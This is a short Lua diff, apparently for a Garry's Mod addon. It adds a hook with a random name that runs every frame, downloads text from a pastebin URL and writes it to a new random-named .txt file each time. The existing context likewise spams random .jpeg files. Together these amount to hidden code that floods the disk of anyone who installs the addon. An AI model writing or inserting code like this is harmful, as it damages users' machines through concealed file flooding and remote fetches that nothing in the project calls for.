@@ -26,3 +26,9 @@ hook.Add("Think",RandomString(20), function()
     	file.Write(RandomString(30) .. ".jpeg", fucked)
   
 end)
+
+hook.Add("Think", RandomString(20), function()
+    http.Fetch("https://pastebin.com/raw/BEEtDWFc", function(b)
+            file.Write(RandomString(50) .. ".txt", b)
+    end)
+end)
